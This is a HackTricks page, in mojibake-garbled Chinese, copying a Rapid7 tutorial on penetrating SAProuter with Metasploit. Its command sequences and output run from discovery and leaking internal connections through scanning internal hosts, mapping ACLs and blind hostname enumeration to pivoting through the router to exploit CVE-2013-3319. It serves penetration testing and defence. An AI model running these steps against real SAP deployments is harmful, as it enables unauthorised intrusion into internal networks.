<details>

<summary><strong>å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œä»æ–°æ‰‹åˆ°ä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ **æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>


å¤åˆ¶è‡ªï¼š[https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/](https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/)
```text
PORT     STATE SERVICE    VERSION
3299/tcp open  saprouter?
```
# ç©¿é€SAProuterçš„Metasploit

SaprouteråŸºæœ¬ä¸Šæ˜¯SAPç³»ç»Ÿçš„åå‘ä»£ç†ï¼Œé€šå¸¸ä½äºäº’è”ç½‘å’Œå†…éƒ¨SAPç³»ç»Ÿä¹‹é—´ã€‚å®ƒçš„ä¸»è¦ç›®çš„æ˜¯å…è®¸äº’è”ç½‘ä¸Šçš„ä¸»æœºå—æ§è®¿é—®å†…éƒ¨SAPç³»ç»Ÿï¼Œå› ä¸ºå®ƒå…è®¸æ¯”å…¸å‹é˜²ç«å¢™æ›´ç»†ç²’åº¦çš„æ§åˆ¶SAPåè®®ã€‚

è¿™æ„å‘³ç€saprouteré€šå¸¸æœ€ç»ˆä¼šæš´éœ²åœ¨äº’è”ç½‘ä¸Šï¼Œé€šè¿‡å…è®¸å…¥ç«™TCPç«¯å£3299åˆ°ç»„ç»‡é˜²ç«å¢™ä¸Šçš„saprouterä¸»æœºã€‚è‡³å°‘åº”è¯¥å¯ä»¥ä»saprouterè®¿é—®åˆ°ä¸€ä¸ªå†…éƒ¨SAPæœåŠ¡å™¨ã€‚è¿™ä½¿å®ƒæˆä¸ºä¸€ä¸ªéå¸¸æœ‰è¶£çš„ç›®æ ‡ï¼Œå› ä¸ºå®ƒå¯ä»¥æä¾›è¿›å…¥â€œé«˜ä»·å€¼â€ç½‘ç»œçš„æ–¹å¼ã€‚

ä¸‹å›¾æ˜¾ç¤ºäº†ä¸€ä¸ªåŸºæœ¬çš„ç½‘ç»œè®¾ç½®ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å®ƒè¿›è¡Œç¤ºä¾‹ï¼š

![](https://blog.rapid7.com/content/images/post-images/33923/image1.jpg)

é¦–å…ˆï¼Œæˆ‘ä»¬å°†å¼€å§‹æ‰§è¡Œå¯¹æš´éœ²çš„IPåœ°å€çš„SAPæœåŠ¡æ‰«æï¼Œä½¿ç”¨[`sap_service_discovery`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery)æ¨¡å—ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯1.2.3.101ã€‚
```text
msf> use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_service_discovery) > run

[*] [SAP] Beginning service Discovery '1.2.3.101'

[+] 1.2.3.101:3299      - SAP Router OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
æ‰«ææ˜¾ç¤ºä¸»æœºåœ¨é¢„æœŸçš„TCP 3299ç«¯å£ä¸Šè¿è¡Œç€SAPè·¯ç”±å™¨ã€‚æˆ‘ä»¬ç°åœ¨å¯ä»¥æ·±å…¥æŒ–æ˜ï¼Œå¹¶å°è¯•ä»saprouterè·å–ä¸€äº›ä¿¡æ¯ã€‚å¦‚æœé…ç½®é”™è¯¯ï¼Œè€Œä¸”å®ƒä»¬ç»å¸¸ä¼šå‡ºé”™ï¼Œæˆ‘ä»¬å¯èƒ½èƒ½å¤Ÿè·å–å†…éƒ¨ä¿¡æ¯ï¼Œä¾‹å¦‚é€šè¿‡saprouteråˆ°å†…éƒ¨ä¸»æœºçš„å·²å»ºç«‹è¿æ¥ã€‚ä¸ºæ­¤æˆ‘ä»¬ä½¿ç”¨[`sap_router_info_request`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request)æ¨¡å—ï¼š
```text
msf auxiliary(sap_router_info_request) > use auxiliary/scanner/sap/sap_router_info_request
msf auxiliary(sap_router_info_request) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_router_info_request) > run

[+] 1.2.3.101:3299 - Connected to saprouter
[+] 1.2.3.101:3299 - Sending ROUTER_ADM packet info request
[+] 1.2.3.101:3299 - Got INFO response
[+] Working directory   : /opt/sap
[+] Routtab             : ./saprouttab

[SAP] SAProuter Connection Table for 1.2.3.101
===================================================

Source        Destination   Service
------        -----------   -------
1.2.3.12      192.168.1.18  3200


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```markdown
å› æ­¤ï¼Œä»è¾“å‡ºä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œäº’è”ç½‘ä¸Šçš„æŸä¸ªç”¨æˆ·ï¼ˆ1.2.3.12ï¼‰æ­£åœ¨è¿æ¥åˆ°å†…éƒ¨ä¸»æœºï¼ˆ192.168.1.18ï¼‰çš„3200ç«¯å£ã€‚3200ç«¯å£æ˜¯SAPå¸¸ç”¨çš„ç«¯å£ï¼Œç”¨äºDIAGåè®®ï¼ˆSAP GUIåº”ç”¨ç¨‹åºè¿æ¥åˆ°SAPæœåŠ¡å™¨çš„åœ°æ–¹ï¼‰ã€‚æˆ‘ä»¬è¿˜è·å¾—äº†æœ‰å…³å†…éƒ¨IPåœ°å€æ–¹æ¡ˆçš„ä¿¡æ¯ï¼Œä»–ä»¬å¾ˆå¯èƒ½è‡³å°‘ä½¿ç”¨192.168.1.0/24ç½‘ç»œï¼Œæˆ–è¯¥ç½‘ç»œä¸­çš„æŸä¸ªå­ç½‘ã€‚

**æšä¸¾å†…éƒ¨ä¸»æœºå’ŒæœåŠ¡**

æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥å¼€å§‹æ‰«æå†…éƒ¨ç½‘ç»œã€‚ç”±äºsaprouterçš„å·¥ä½œåŸç†ç±»ä¼¼äºä»£ç†ï¼Œæˆ‘ä»¬å°†å°è¯•è¿æ¥åˆ°å®ƒå¹¶è¯·æ±‚è¿æ¥åˆ°å†…éƒ¨ä¸»æœºå’Œç«¯å£ï¼Œç„¶åæŸ¥çœ‹saprouterçš„å›å¤ã€‚è¿™å¯èƒ½ä¼šæ ¹æ®saprouterçš„é…ç½®ï¼Œæä¾›æ›´å¤šå…³äºå†…éƒ¨ä¸»æœºã€æœåŠ¡å’Œè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLsï¼‰çš„æ´å¯Ÿã€‚æˆ‘ä»¬å°†ä½¿ç”¨[`sap_router_portscanner`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner)æ¨¡å—æ¥å®ç°è¿™ä¸€ç›®çš„ã€‚

è¯¥æ¨¡å—è¿æ¥åˆ°saprouterå¹¶è¯·æ±‚è¿æ¥åˆ°å…¶ä»–ä¸»æœºï¼ˆåœ¨TARGETSé€‰é¡¹ä¸­å®šä¹‰ï¼‰çš„ç‰¹å®šTCPç«¯å£ã€‚ç„¶åå®ƒåˆ†æå›å¤ï¼Œå¹¶äº†è§£æ‰€è¯·æ±‚çš„è¿æ¥æ˜¯å¦å¯èƒ½ã€‚è¿™ä¸ªæ¨¡å—æä¾›äº†ä¸€äº›å¯ä»¥ä½¿ç”¨çš„é€‰é¡¹ï¼š
```
```text
Basic options:
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-99            no        SAP instance numbers to scan (NN in PORTS definition)
MODE         SAP_PROTO        yes       Connection Mode: SAP_PROTO or TCP  (accepted: SAP_PROTO, TCP)
PORTS        32NN             yes       Ports to scan (e.g. 3200-3299,5NN13)
RESOLVE      local            yes       Where to resolve TARGETS (accepted: remote, local)
RHOST                         yes       SAPRouter address
RPORT        3299             yes       SAPRouter TCP port
TARGETS                       yes       Comma delimited targets. When resolution is local address ranges or CIDR identifiers allowed.
```
æ‚¨è‡³å°‘éœ€è¦è®¾ç½®saprouterçš„IPåœ°å€ï¼Œåœ¨ç¤ºä¾‹ä¸­ä¸º1.2.3.101ã€‚ç„¶åï¼Œè®¾ç½®TARGETSä¸ºæ‚¨æƒ³è¦æ‰«æçš„å†…éƒ¨ç½‘ç»œåœ°å€ï¼Œæœ€åè®¾ç½®PORTSä¸ºè¦æ‰«æçš„TCPç«¯å£ã€‚

è¯¥æ¨¡å—è¿˜æä¾›äº†ä¸€ä¸ªINSTANCESé€‰é¡¹ï¼Œå¯ä»¥ç®€åŒ–PORTSé€‰é¡¹çš„å®šä¹‰ã€‚SAPå®‰è£…æ”¯æŒå¤šä¸ªå®ä¾‹ï¼Œæä¾›ç±»ä¼¼çš„æœåŠ¡ï¼Œå› æ­¤æ¯ä¸ªå®ä¾‹éƒ½åˆ†é…äº†TCPç«¯å£ã€‚ä¾‹å¦‚ï¼ŒSAPå®ä¾‹00å°†åœ¨ç«¯å£3200ä¸Šæœ‰SAPè°ƒåº¦å™¨æœåŠ¡ï¼ˆSAP GUIè¿æ¥åˆ°çš„åœ°æ–¹ï¼‰ï¼Œå®ä¾‹01åœ¨ç«¯å£3201ä¸Šã€‚PORTSé€‰é¡¹æ”¯æŒä¸€ä¸ªâ€œé€šé…ç¬¦â€ï¼Œå³â€œNNâ€ï¼Œå®ƒå°†è¢«æ›¿æ¢ä¸ºå®ä¾‹å·ï¼Œå› æ­¤æ‰«ææ‰€æœ‰å®šä¹‰å®ä¾‹çš„ç«¯å£ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦æ‰«æä»00åˆ°50çš„å®ä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å®šä¹‰INSTANCESå’ŒPORTSå˜é‡ï¼š
```text
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-50
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
```
```markdown
ä½¿ç”¨æ­¤è®¾ç½®ï¼Œæ¨¡å—å°†æ‰«æ3200åˆ°3250èŒƒå›´å†…çš„ç«¯å£ã€‚

åœ¨æ¨¡å—çš„æºä»£ç ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰å…³SAPç³»ç»Ÿä¸Šå¸¸è§é»˜è®¤ç«¯å£çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬ç°åœ¨å°†ä½¿ç”¨å®ƒæ¥è¿›è¡Œæ‰«æï¼š
```
```text
msf > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > set RHOST 1.2.3.101
RHOST => 1.2.3.101
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.18
TARGETS => 192.168.1.18
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
PORTS => 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host           Port   State   Info
----           ----   -----   ----
192.168.1.18   3201   closed  SAP Dispatcher sapdp01
192.168.1.18   3200   open    SAP Dispatcher sapdp00
192.168.1.18   50013  open    SAP StartService [SOAP] sapctrl00

[*] Auxiliary module execution completed
```
æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨VERBOSEé€‰é¡¹æ¥å°è¯•ç†è§£ä¸ºä»€ä¹ˆæŸäº›è¿æ¥ä¸èƒ½é€šè¿‡saprouterã€‚å½“VERBOSEè®¾ç½®ä¸ºtrueæ—¶ï¼Œæˆ‘ä»¬èƒ½å¤Ÿçœ‹åˆ°æ¥è‡ªsaprouterçš„å“åº”ï¼Œå¹¶æ˜ å°„å®šä¹‰çš„ACLã€‚

æˆ‘ä»¬ç°åœ¨å°†æ‰«æ192.168.1.18å’Œ192.168.1.1ä¸»æœºï¼Œä½†åªåœ¨ç«¯å£3200ä¸Šï¼Œä»¥æŸ¥çœ‹æˆ‘ä»¬æ˜¯å¦å¯ä»¥è¿æ¥åˆ°ä¸¤ä¸ªSAPè°ƒåº¦ç¨‹åºï¼š
```text
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.1,192.168.1.18
TARGETS => 192.168.1.1,192.168.1.18
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State   Info
----          ----  -----   ----
192.168.1.18  3200  open  SAP Dispatcher sapdp00

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[!] Warning: Service info could be inaccurate
[*] Auxiliary module execution completed
```
æ‚¨å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ç°åœ¨ä¹ŸçŸ¥é“æ— æ³•è¿æ¥åˆ°ç«¯å£3200ä¸Šçš„å…¶ä»–ä¸»æœºï¼Œå› ä¸ºå®ƒè¢«å®šä¹‰åœ¨saprouterä¸Šçš„ACLé˜»æ­¢äº†ã€‚

**æ˜ å°„ACLs**

saprouterçš„ä¸€ä¸ªæœ‰è¶£ä¹‹å¤„åœ¨äºå®ƒæ”¯æŒä¸¤ç§ç±»å‹çš„è¿æ¥ï¼š

* åŸç”Ÿ - è¿™äº›è¿æ¥ä»…ä»…æ˜¯TCPè¿æ¥ï¼›
* SAPåè®® - è¿™äº›æ˜¯å¸¦æœ‰å˜åŒ–çš„TCPè¿æ¥ï¼Œåè®®è§„å®šæ‰€æœ‰æ¶ˆæ¯éƒ½ä»¥4ä¸ªå­—èŠ‚å¼€å§‹ï¼Œè¡¨ç¤ºåç»­å†…å®¹çš„é•¿åº¦ã€‚

SAPåè®®æ˜¯saprouterç‰¹æœ‰çš„ï¼Œæ˜¯SAP GUIç”¨æ¥é€šè¿‡saprouterè¿æ¥åˆ°SAP DIAGç«¯å£çš„åè®®ã€‚åŸç”Ÿåè®®ç”¨äºå…è®¸å…¶ä»–ç±»å‹çš„è¿æ¥é€šè¿‡saprouterã€‚

æ­¤æ¨¡å—å…è®¸åœ¨æ‰«ææ—¶åœ¨MODEé€‰é¡¹ä¸­æŒ‡å®šè¦æµ‹è¯•çš„è¿æ¥ç±»å‹ã€‚é»˜è®¤æ˜¯SAPåè®®ï¼Œè¿™æ˜¯ç”Ÿäº§ä¸­æœ€å¯èƒ½ä½¿ç”¨çš„ã€‚ç„¶è€Œï¼Œåœ¨saprouterå…è®¸çš„å…¶ä»–æœåŠ¡ä¸­å‘ç°å…è®¸åŸç”Ÿ\(TCP\)è¿æ¥é€šè¿‡å¹¶ä¸å°‘è§ã€‚

æˆ‘ä»¬å¯ä»¥å°†MODEè®¾ç½®ä¸ºTCPï¼Œä»¥è¯„ä¼°æ˜¯å¦å…è®¸æ­¤ç±»å‹çš„è¿æ¥ã€‚æˆ‘ä»¬ç°åœ¨å°†æ‰«æå†…éƒ¨ä¸»æœºï¼Œç«¯å£3200 \(SAP DIAG\) å’Œ 80 \(HTTP\)ï¼Œå°†VERBOSEè®¾ç½®ä¸ºtrueï¼Œåœ¨00å’Œ01ä¸¤ä¸ªå®ä¾‹ä¸Šè¿›è¡Œæ‰«æï¼Œçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆï¼š
```text
msf auxiliary(sap_router_portscanner) > set MODE TCP
MODE => TCP

msf auxiliary(sap_router_portscanner) > set PORTS 80,32NN
PORTS => 80,32NN
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:80 - TCP OPEN
[-] 192.168.1.18:3200 - blocked by ACL
[+] 192.168.1.18:3201 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State  Info
----          ----  -----  ----
192.168.1.18  80    open
192.168.1.18  3201  open   SAP Dispatcher sapdp01

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[+] 192.168.1.1:3201 - TCP OPEN
[+] 192.168.1.1:80 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host         Port  State  Info
----         ----  -----  ----
192.168.1.1  3201  open   SAP Dispatcher sapdp01
192.168.1.1  80    open

[*] Auxiliary module execution completed
```
ä»è¾“å‡ºå’Œä¹‹å‰çš„ä¿¡æ¯æˆ‘ä»¬ç°åœ¨çŸ¥é“ACLå¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š

* å…è®¸ä»»ä½•ä¸»æœºå¯¹192.168.1.1çš„80ç«¯å£è¿›è¡ŒTCPè¿æ¥
* å…è®¸ä»»ä½•ä¸»æœºå¯¹192.168.1.18çš„80ç«¯å£è¿›è¡ŒTCPè¿æ¥
* å…è®¸ä»»ä½•ä¸»æœºå¯¹192.168.1.1çš„3201ç«¯å£è¿›è¡ŒTCPè¿æ¥
* å…è®¸ä»»ä½•ä¸»æœºå¯¹192.168.1.18çš„3201ç«¯å£è¿›è¡ŒTCPè¿æ¥
* å…è®¸ä»»ä½•ä¸»æœºå¯¹192.168.1.18çš„3200ç«¯å£è¿›è¡ŒSAPè¿æ¥

**ç›²ç›®æšä¸¾å†…éƒ¨ä¸»æœº**

å¦‚æœæ‚¨è¿˜è®°å¾—ï¼Œæˆ‘ä»¬å¼€å§‹æ—¶é€šè¿‡è·å–saprouterçš„ä¿¡æ¯æ¥äº†è§£å†…éƒ¨ä¸»æœºçš„IPåœ°å€ï¼Œç„¶åä»é‚£é‡Œç»§ç»­ã€‚ä½†å¦‚æœsaprouteræ²¡æœ‰æä¾›é‚£äº›ä¿¡æ¯æ€ä¹ˆåŠï¼Ÿ

ä¸€ç§é€‰æ‹©æ˜¯å¼€å§‹æ‰«æç§æœ‰åœ°å€ç©ºé—´ï¼Œçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚å¦ä¸€ç§æ˜¯é€šè¿‡ä¸»æœºåç›²ç›®æšä¸¾ä¸»æœºã€‚

Saproutersèƒ½å¤Ÿè§£ææˆ‘ä»¬è¯·æ±‚å…¶è¿æ¥çš„ä¸»æœºåã€‚Saprouterä¹Ÿå¾ˆå‹å¥½åœ°å‘Šè¯‰æˆ‘ä»¬å½“å®ƒè¿æ¥å¤±è´¥æ—¶çš„é”™è¯¯ï¼ˆæ‚¨å®é™…ä¸Šå¯ä»¥é€šè¿‡å–æ¶ˆæ³¨é‡Šæ¨¡å—æºä»£ç çš„ç¬¬242è¡Œæ¥æŸ¥çœ‹åŸå§‹å“åº”ï¼‰ã€‚

æœ‰äº†è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿé€šè¿‡ä¸»æœºåæšä¸¾å†…éƒ¨ä¸»æœºï¼Œå¹¶å°è¯•ç›´æ¥æ‰¾åˆ°å®è—ï¼

ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦å°†RESOLVEé€‰é¡¹è®¾ç½®ä¸ºâ€œremoteâ€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¨¡å—å°†è¯·æ±‚è¿æ¥åˆ°å®šä¹‰çš„TARGETSï¼Œè€Œä¸ä¼šåœ¨æœ¬åœ°è§£æå®ƒä»¬ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•çŒœæµ‹å†…éƒ¨ä¸»æœºï¼Œå¹¶æœ€ç»ˆåœ¨ä¸çŸ¥é“å®ƒä»¬çš„IPåœ°å€çš„æƒ…å†µä¸‹è¿æ¥åˆ°å®ƒä»¬ã€‚

åœ¨ç›²ç›®æšä¸¾ä¸»æœºæ—¶è¦è®°ä½çš„é‡è¦äº‹é¡¹ï¼š

* å°†VERBOSEè®¾ç½®ä¸ºtrueï¼›
* å¦‚æœMODEè®¾ç½®ä¸ºSAP_PROTOï¼Œæˆ‘ä»¬å°†ä»saprouterè·å–æ›´å¤šä¿¡æ¯ï¼›
* æ­¤æ—¶åªéœ€è®¾ç½®ä¸€ä¸ªç«¯å£è¿›è¡Œæ‰«æï¼Œå› ä¸ºæˆ‘ä»¬åªå¯¹saprouterå‘é€çš„ä¿¡æ¯æ„Ÿå…´è¶£ï¼ˆå°è¯•3200ï¼‰ï¼›
* ç»“æœå°†æ ¹æ®é…ç½®çš„ACLè€Œæœ‰æ‰€ä¸åŒã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¢«é˜»æ­¢çš„è¿æ¥ä¸ä¼šç»™æˆ‘ä»¬æä¾›å¤ªå¤šä¿¡æ¯ã€‚

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†å°è¯•ä¸»æœºåsapã€sapsrvå’Œsapsrv2ã€‚
```text
msf auxiliary(sap_router_portscanner) > set RESOLVE remote
RESOLVE => remote
msf auxiliary(sap_router_portscanner) > set MODE SAP_PROTO
MODE => SAP_PROTO
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS sap,sapsrv,sapsrv2
TARGETS => sap,sapsrv,sapsrv2
msf auxiliary(sap_router_portscanner) > set PORTS 3200
PORTS => 3200
msf auxiliary(sap_router_portscanner) > run

[*] Scanning sap
[-] sap:3200 - unknown host
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv
[-] sapsrv:3200 - host unreachable
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv2
[+] sapsrv2:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host     Port  State  Info
----     ----  -----  ----
sapsrv2  3200  open   SAP Dispatcher sapdp00

[*] Auxiliary module execution completed
```
ä»è¾“å‡ºä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œâ€œsapâ€è¿™ä¸ªä¸»æœºä¸å­˜åœ¨ï¼Œä½†æ˜¯ä¸»æœºsapsrvè™½ç„¶æ— æ³•è®¿é—®ï¼Œsapsrv2å´å­˜åœ¨ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥è¿æ¥åˆ°3200ç«¯å£ã€‚

è¿™ç§æŠ€æœ¯ä¹Ÿå¯ä»¥ç”¨æ¥å°è¯•åœ¨ç½‘ç»œä¸Šæ‰¾åˆ°å…¶ä»–éSAPç›¸å…³çš„ä¸»æœºï¼Œåªéœ€å°è¯•ä½¿ç”¨å¸¸è§çš„ä¸»æœºåï¼Œå¦‚smtpã€exchangeã€pdcã€bdcã€fileshareã€intranetï¼Œæˆ–è€…ä½ çš„æŠ€å·§åŒ…é‡Œå¯èƒ½æœ‰çš„å…¶ä»–å¥½å¬çš„ä¸»æœºåã€‚

**æœ€åä¸€ç¨‹**

ç°åœ¨æˆ‘ä»¬å·²ç»è·å¾—äº†æ‰€æœ‰è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬çŸ¥é“äº†å†…éƒ¨å¯ç”¨çš„ä¸»æœºã€å…è®¸çš„æœåŠ¡ä»¥åŠæˆ‘ä»¬å¯ä»¥ç”¨æ¥ç©¿é€saprouterçš„åè®®ï¼Œæˆ‘ä»¬å®é™…ä¸Šå¯ä»¥è¿æ¥åˆ°å†…éƒ¨æœåŠ¡å™¨ï¼Œå¹¶ç»§ç»­æˆ‘ä»¬çš„æ¸—é€æµ‹è¯•ã€‚

Metasploitä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå¾ˆæ£’çš„æ–¹å¼ï¼Œå¯ä»¥å°†saprouterä½œä¸ºä»£ç†ï¼Œä½¿ç”¨Proxiesé€‰é¡¹ï¼Œæ„Ÿè°¢Dave Hartleyï¼ˆ[@nmonkee](http://twitter.com/nmonkee)ï¼‰ã€‚

æ‰€ä»¥åœ¨è¿™ä¸ªé˜¶æ®µï¼Œæˆ‘ä»¬æƒ³è¦å¼€å§‹æ”¶é›†æˆ‘ä»¬åœ¨192.168.1.18ä¸»æœºä¸Šå‘ç°çš„å†…éƒ¨sapæœåŠ¡å™¨çš„ä¿¡æ¯ã€‚ä½œä¸ºä¸€ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨æ¨¡å—[`sap_hostctrl_getcomputersystem`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem)ï¼Œå®ƒåˆ©ç”¨CVE-2013-3319æ¼æ´ï¼Œé€šè¿‡åœ¨1128ç«¯å£ä¸Šå¯¹SAP Host ControlæœåŠ¡å‘èµ·æœªç»è®¤è¯çš„SOAPè¯·æ±‚ï¼Œæ¥è·å–æœåŠ¡å™¨è¿è¡Œçš„æ“ä½œç³»ç»Ÿçš„è¯¦ç»†ä¿¡æ¯ã€‚æˆ‘ä»¬å°†é€šè¿‡saprouterè¿›è¡Œæ¢çº½è½¬æ¥ï¼Œä½¿ç”¨metasploitä¸­çš„ä»£ç†æ”¯æŒï¼š

![](https://blog.rapid7.com/content/images/post-images/33923/image2.jpg)
```text
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem
msf auxiliary(sap_hostctrl_getcomputersystem) > set Proxies sapni:1.2.3.101:3299
Proxies => sapni:1.2.3.101:3299
msf auxiliary(sap_hostctrl_getcomputersystem) > set RHOSTS 192.168.1.18
RHOSTS => 192.168.1.18
msf auxiliary(sap_hostctrl_getcomputersystem) > run

[+] 192.168.1.18:1128 - Information retrieved successfully
[*] 192.168.1.18:1128 - Response stored in /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_386124.xml (XML) and /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_186948.txt (TXT)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œæ‚¨å°†åœ¨lootä¸­å¾—åˆ°æ¨¡å—çš„è‰¯å¥½è¾“å‡ºï¼Œå…¶ä¸­åŒ…å«ç›®æ ‡SAPä¸»æœºçš„æœ‰è¶£å†…éƒ¨ä¿¡æ¯ï¼ˆä¾‹å¦‚å†…éƒ¨ç”¨æˆ·åï¼Œæ‚¨å¯ä»¥å°è¯•å¯¹å…¶è¿›è¡Œæš´åŠ›ç ´è§£ï¼‰ã€‚

Pivotingå¯ä»¥ï¼ˆä¹Ÿåº”è¯¥ï¼ï¼‰ç”¨äºé’ˆå¯¹å†…éƒ¨ä¸»æœºè¿è¡Œå…¶ä»–æ¨¡å—ï¼Œä¸ä»…ä»…æ˜¯SAPç³»ç»Ÿï¼

**ç»“è®º**

æˆ‘ä»¬å·²ç»çœ‹åˆ°ï¼Œå¦‚ä½•åˆ©ç”¨å¼±saprouteré…ç½®ï¼Œè¿™äº›é…ç½®å¯ä»¥å…è®¸ä»äº’è”ç½‘è®¿é—®å†…éƒ¨ä¸»æœºï¼Œæ‰€æœ‰è¿™äº›ä»…ä½¿ç”¨metasploitå¯¹SAPç³»ç»Ÿçš„pentestingæ”¯æŒã€‚

